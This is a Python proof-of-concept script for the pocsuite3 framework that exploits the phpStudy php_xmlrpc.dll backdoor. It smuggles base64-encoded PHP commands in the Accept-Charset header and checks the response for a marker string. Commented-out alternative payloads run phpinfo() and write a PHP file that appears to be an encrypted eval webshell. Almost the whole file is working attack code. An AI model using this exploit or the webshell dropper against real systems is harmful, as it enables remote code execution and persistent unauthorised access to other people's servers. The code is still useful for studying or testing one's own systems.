from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
import time
import requests


class PHPStudyPOC(POCBase):
		vulID = '1'
		name = 'phpstudy rce poc'
		appName = 'phpstudy'
		appVersion = 'phpStudy'
		desc = '引用了php_xmlrpc.dll文件,执行任意代码'

			
		def _verify(self):
				result = {}
				headers = {
							'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27',
        					'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        					'Accept-Charset': 'ZWNobyAnZWVTenh1OTJuSURBYic7',  # 输出 eeSzxu92nIDAb
							#'Accept-Charset': 'cGhwaW5mbygpOw==', # phpinfo();
							#'Accept-Charset' : 'ZWNobygxMjM0KTtmaWxlX3B1dF9jb250ZW50cygnc2JzYnNiLnBocCcsYmFzZTY0X2RlY29kZSgnUEQ5d2FIQUtRR1Z5Y205eVgzSmxjRzl5ZEdsdVp5Z3dLVHNLYzJWemMybHZibDl6ZEdGeWRDZ3BPd3BwWmlBb2FYTnpaWFFvSkY5SFJWUmJKM0JoYzNNblhTa3BDbnNLSUNBZ0lDUnJaWGs5YzNWaWMzUnlLRzFrTlNoMWJtbHhhV1FvY21GdVpDZ3BLU2tzTVRZcE93b2dJQ0FnSkY5VFJWTlRTVTlPV3lkckoxMDlKR3RsZVRzS0lDQWdJSEJ5YVc1MElDUnJaWGs3Q24wS1pXeHpaUXA3Q2lBZ0lDQWthMlY1UFNSZlUwVlRVMGxQVGxzbmF5ZGRPd29KSkhCdmMzUTlabWxzWlY5blpYUmZZMjl1ZEdWdWRITW9JbkJvY0RvdkwybHVjSFYwSWlrN0NnbHBaaWdoWlhoMFpXNXphVzl1WDJ4dllXUmxaQ2duYjNCbGJuTnpiQ2NwS1FvSmV3b0pDU1IwUFNKaVlYTmxOalJmSWk0aVpHVmpiMlJsSWpzS0NRa2tjRzl6ZEQwa2RDZ2tjRzl6ZEM0aUlpazdDZ2tKQ2drSlptOXlLQ1JwUFRBN0pHazhjM1J5YkdWdUtDUndiM04wS1Rza2FTc3JLU0I3Q2lBZ0lDQUpDUWtnSkhCdmMzUmJKR2xkSUQwZ0pIQnZjM1JiSkdsZFhpUnJaWGxiSkdrck1TWXhOVjA3SUFvZ0lDQWdDUWtKZlFvSmZRb0paV3h6WlFvSmV3b0pDU1J3YjNOMFBXOXdaVzV6YzJ4ZlpHVmpjbmx3ZENna2NHOXpkQ3dnSWtGRlV6RXlPQ0lzSUNSclpYa3BPd29KZlFvZ0lDQWdKR0Z5Y2oxbGVIQnNiMlJsS0NkOEp5d2tjRzl6ZENrN0NpQWdJQ0FrWm5WdVl6MGtZWEp5V3pCZE93b2dJQ0FnSkhCaGNtRnRjejBrWVhKeVd6RmRPd29KWTJ4aGMzTWdRM3R3ZFdKc2FXTWdablZ1WTNScGIyNGdYMTlqYjI1emRISjFZM1FvSkhBcElIdGxkbUZzS0NSd0xpSWlLVHQ5ZlFvSlFHNWxkeUJES0NSd1lYSmhiWE1wT3dwOUNqOCsnKSk7Cj8+',
							'Accept-Encoding': 'gzip,deflate',
        					'Accept-Language': 'zh-CN,zh;q=0.9',
						}
				url = self.url
				payload = 'dede123'
				match_string="eeSzxu92nIDAb"
				try:
					resp = requests.get(url, timeout=20, headers=headers)
					time.sleep(2)
					if resp.text:
							if match_string in resp.text:
									result['VerifyInfo'] = {}
									result['VerifyInfo']['URL'] = url
									result['VerifyInfo']['Name'] = payload
				except Exception as e:
					print(e)
					pass

				return self.parse_output(result)
  
		def parse_output(self, result):
				output = Output(self)
				if result:
						output.success(result)
				else:
					output.fail('target is not vulnerable')
				return output


		def _attack(self):
				return self._verify()

register_poc(PHPStudyPOC)
